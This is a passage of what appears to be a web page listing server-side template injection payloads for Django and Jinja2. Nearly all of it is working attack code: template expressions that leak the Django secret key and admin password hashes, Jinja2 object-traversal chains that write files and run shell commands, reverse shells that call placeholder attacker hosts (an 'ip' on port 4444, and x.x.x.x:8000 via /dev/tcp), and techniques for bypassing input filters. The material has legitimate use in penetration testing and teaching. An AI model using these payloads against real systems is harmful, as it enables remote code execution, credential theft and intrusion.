  <a class="anchor" href="#detection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span> }}  <span style="color:#75715e"># Error with Django Templates</span>
</span></span><span style="display:flex;"><span>ih0vr{{<span style="color:#ae81ff">364</span><span style="color:#f92672">|</span>add:<span style="color:#ae81ff">733</span>}}d121r <span style="color:#75715e"># Burp Payload -&gt; ih0vr1097d121r</span>
</span></span></code></pre></div><h3 id="django-templates-for-post-exploitation">
  Django Templates for post-exploitation
  <a class="anchor" href="#django-templates-for-post-exploitation">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Variables</span>
</span></span><span style="display:flex;"><span>{{ variable }}
</span></span><span style="display:flex;"><span>{{ variable<span style="color:#f92672">.</span>attr }}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Filters</span>
</span></span><span style="display:flex;"><span>{{ value<span style="color:#f92672">|</span>length }}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tags</span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> csrf_token <span style="color:#f92672">%</span>}
</span></span></code></pre></div><h3 id="cross-site-scripting">
  Cross-site scripting
  <a class="anchor" href="#cross-site-scripting">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&lt;script&gt;alert(3)&lt;/script&gt;&#39;</span> }}
</span></span><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&lt;script&gt;alert(3)&lt;/script&gt;&#39;</span> <span style="color:#f92672">|</span> safe }}
</span></span></code></pre></div><h3 id="debug-information-leak">
  Debug information leak
  <a class="anchor" href="#debug-information-leak">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> debug <span style="color:#f92672">%</span>}
</span></span></code></pre></div><h3 id="leaking-apps-secret-key">
  Leaking app’s Secret Key
  <a class="anchor" href="#leaking-apps-secret-key">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ messages<span style="color:#f92672">.</span>storages<span style="color:#ae81ff">.0</span><span style="color:#f92672">.</span>signer<span style="color:#f92672">.</span>key }}
</span></span></code></pre></div><h3 id="admin-site-url-leak">
  Admin Site URL leak
  <a class="anchor" href="#admin-site-url-leak">#</a>
</h3>
<pre tabindex="0"><code>{% include &#39;admin/base.html&#39; %}
</code></pre><h3 id="admin-username-and-password-hash-leak">
  Admin username and password hash leak
  <a class="anchor" href="#admin-username-and-password-hash-leak">#</a>
</h3>
<pre tabindex="0"><code>{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}
</code></pre><h2 id="jinja2">
  Jinja2
  <a class="anchor" href="#jinja2">#</a>
</h2>
<p><a href="https://jinja.palletsprojects.com/">Official website</a></p>
<blockquote>
<p>Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.</p>
</blockquote>
<h3 id="jinja2---basic-injection">
  Jinja2 - Basic injection
  <a class="anchor" href="#jinja2---basic-injection">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>}}[[<span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>]]
</span></span><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;7&#39;</span>}} would result <span style="color:#f92672">in</span> <span style="color:#ae81ff">7777777</span>
</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">.</span>items()}}
</span></span></code></pre></div><p>Jinja2 is used by Python Web Frameworks such as Django or Flask.
The above injections have been tested on a Flask application.</p>
<h3 id="jinja2---template-format">
  Jinja2 - Template format
  <a class="anchor" href="#jinja2---template-format">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> extends <span style="color:#e6db74">&#34;layout.html&#34;</span> <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> block body <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span>ul<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>li<span style="color:#f92672">&gt;&lt;</span>a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ user.url }}&#34;</span><span style="color:#f92672">&gt;</span>{{ user<span style="color:#f92672">.</span>username }}<span style="color:#f92672">&lt;/</span>a<span style="color:#f92672">&gt;&lt;/</span>li<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/</span>ul<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endblock <span style="color:#f92672">%</span>}
</span></span></code></pre></div><h3 id="jinja2---debug-statement">
  Jinja2 - Debug Statement
  <a class="anchor" href="#jinja2---debug-statement">#</a>
</h3>
<p>If the Debug Extension is enabled, a <code>{% debug %}</code> tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>pre<span style="color:#f92672">&gt;</span>{<span style="color:#f92672">%</span> debug <span style="color:#f92672">%</span>}<span style="color:#f92672">&lt;/</span>pre<span style="color:#f92672">&gt;</span>
</span></span></code></pre></div><p>Source: <a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement">https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement</a></p>
<h3 id="jinja2---dump-all-used-classes">
  Jinja2 - Dump all used classes
  <a class="anchor" href="#jinja2---dump-all-used-classes">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ []<span style="color:#f92672">.</span>class<span style="color:#f92672">.</span>base<span style="color:#f92672">.</span>subclasses() }}
</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>class<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>subclasses()}}
</span></span><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__() }}
</span></span></code></pre></div><p>Access <code>__globals__</code> and <code>__builtins__</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__ }}
</span></span></code></pre></div><h3 id="jinja2---dump-all-config-variables">
  Jinja2 - Dump all config variables
  <a class="anchor" href="#jinja2---dump-all-config-variables">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> config<span style="color:#f92672">.</span>iteritems() <span style="color:#f92672">%</span>}
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>dt<span style="color:#f92672">&gt;</span>{{ key<span style="color:#f92672">|</span>e }}<span style="color:#f92672">&lt;/</span>dt<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>dd<span style="color:#f92672">&gt;</span>{{ value<span style="color:#f92672">|</span>e }}<span style="color:#f92672">&lt;/</span>dd<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</span></span></code></pre></div><h3 id="jinja2---write-into-remote-file">
  Jinja2 - Write into remote file
  <a class="anchor" href="#jinja2---write-into-remote-file">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/var/www/html/myflaskapp/hello.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Hello here !&#39;</span>) }}
</span></span></code></pre></div><h3 id="jinja2---remote-code-execution">
  Jinja2 - Remote Code Execution
  <a class="anchor" href="#jinja2---remote-code-execution">#</a>
</h3>
<p>Listen for connection</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">8000</span>
</span></span></code></pre></div><h4 id="jinja2---forcing-output-on-blind-rce">
  Jinja2 - Forcing output on blind RCE
  <a class="anchor" href="#jinja2---forcing-output-on-blind-rce">#</a>
</h4>
<p>You can import Flask functions to return an output from the vulnerable page.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>{{
</span></span><span style="display:flex;"><span>x<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#34;from flask import current_app, after_this_request</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@after_this_request</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> make_response
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> make_response(<span style="color:#e6db74">&#39;Powned&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;)</span>
</span></span><span style="display:flex;"><span>}}
</span></span></code></pre></div><h4 id="exploit-the-ssti-by-calling-ospopenread">
  Exploit the SSTI by calling os.popen().read()
  <a class="anchor" href="#exploit-the-ssti-by-calling-ospopenread">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span></code></pre></div><p>But when <code>__builtins__</code> is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>_TemplateReference__context<span style="color:#f92672">.</span>cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>_TemplateReference__context<span style="color:#f92672">.</span>joiner<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>_TemplateReference__context<span style="color:#f92672">.</span>namespace<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span></code></pre></div><p>We can use these shorter payloads:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span><span style="display:flex;"><span>{{ joiner<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span><span style="display:flex;"><span>{{ namespace<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span></code></pre></div><p>Source <a href="https://twitter.com/podalirius_">@podalirius_</a> : <a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/</a></p>
<p>With <a href="https://github.com/p0dalirius/objectwalker">objectwalker</a> we can find a path to the <code>os</code> module from <code>lipsum</code>. This is the shortest payload known to achieve RCE in a Jinja2 template:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ lipsum<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#34;os&#34;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
</span></span></code></pre></div><p>Source: <a href="https://twitter.com/podalirius_/status/1655970628648697860">https://twitter.com/podalirius_/status/1655970628648697860</a></p>
<h4 id="exploit-the-ssti-by-calling-subprocesspopen">
  Exploit the SSTI by calling subprocess.Popen
  <a class="anchor" href="#exploit-the-ssti-by-calling-subprocesspopen">#</a>
</h4>
<p>:warning: the number 396 will vary depending of the application.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">396</span>](<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,stdout<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>communicate()[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>strip()}}
</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ls&#39;</span>)<span style="color:#f92672">.</span>read()}}
</span></span></code></pre></div><h4 id="exploit-the-ssti-by-calling-popen-without-guessing-the-offset">
  Exploit the SSTI by calling Popen without guessing the offset
  <a class="anchor" href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">ip</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/cat</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">flag.txt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#39;&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">417</span>)}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
</span></span></code></pre></div><p>Simply modification of payload to clean up output and facilitate command input (<a href="https://twitter.com/SecGus/status/1198976764351066113">https://twitter.com/SecGus/status/1198976764351066113</a>)
In another GET parameter include a variable named &ldquo;input&rdquo; that contains the command you want to run (For example: &amp;input=ls)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>input)<span style="color:#f92672">.</span>read()}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
</span></span></code></pre></div><h4 id="exploit-the-ssti-by-writing-an-evil-config-file">
  Exploit the SSTI by writing an evil config file.
  <a class="anchor" href="#exploit-the-ssti-by-writing-an-evil-config-file">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># evil config</span>
</span></span><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/tmp/evilconfig.cfg&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;from subprocess import check_output</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">RUNCMD = check_output</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>) }}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># load the evil config</span>
</span></span><span style="display:flex;"><span>{{ config<span style="color:#f92672">.</span>from_pyfile(<span style="color:#e6db74">&#39;/tmp/evilconfig.cfg&#39;</span>) }}  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># connect to evil host</span>
</span></span><span style="display:flex;"><span>{{ config[<span style="color:#e6db74">&#39;RUNCMD&#39;</span>](<span style="color:#e6db74">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&#34;&#39;</span>,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) }}
</span></span></code></pre></div><h3 id="jinja2---filter-bypass">
  Jinja2 - Filter bypass
  <a class="anchor" href="#jinja2---filter-bypass">#</a>
</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>request<span style="color:#f92672">.</span>__class__
</span></span><span style="display:flex;"><span>request[<span style="color:#e6db74">&#34;__class__&#34;</span>]
</span></span></code></pre></div><p>Bypassing <code>_</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr([request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>class,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">|</span>join)}}<span style="color:#f92672">&amp;</span>class<span style="color:#f92672">=</span>class<span style="color:#f92672">&amp;</span>usc<span style="color:#f92672">=</span>_
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr([request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>class,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">|</span>join)}}
</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr([<span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#34;class&#34;</span>,<span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">|</span>join)}}
</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr([<span style="color:#e6db74">&#34;__&#34;</span>,<span style="color:#e6db74">&#34;class&#34;</span>,<span style="color:#e6db74">&#34;__&#34;</span>]<span style="color:#f92672">|</span>join)}}
</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#34;__class__&#34;</span>)}}
</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">.</span>__class__}}
</span></span></code></pre></div><p>Bypassing <code>[</code> and <code>]</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr((request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>class,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>join)}}<span style="color:#f92672">&amp;</span>class<span style="color:#f92672">=</span>class<span style="color:#f92672">&amp;</span>usc<span style="color:#f92672">=</span>_
</span></span><span style="display:flex;"><span><span style="color:#f92672">or</span>
</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>getlist(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>l)<span style="color:#f92672">|</span>join)}}<span style="color:#f92672">&amp;</span>l<span style="color:#f92672">=</span>a<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>class<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_
</span></span></code></pre></div><p>Bypassing <code>|join</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>f<span style="color:#f92672">|</span>format(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a))}}<span style="color:#f92672">&amp;</span>f<span style="color:#f92672">=%</span>s<span style="color:#f92672">%</span>sclass<span style="color:#f92672">%</span>s<span style="color:#f92672">%</span>s<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_
</span></span></code></pre></div><p>Bypassing most common filters (&rsquo;.&rsquo;,&rsquo;_&rsquo;,&rsquo;|join&rsquo;,&rsquo;[&rsquo;,&rsquo;]&rsquo;,&lsquo;mro&rsquo; and &lsquo;base&rsquo;) by <a href="https://twitter.com/SecGus">https://twitter.com/SecGus</a>:</p>
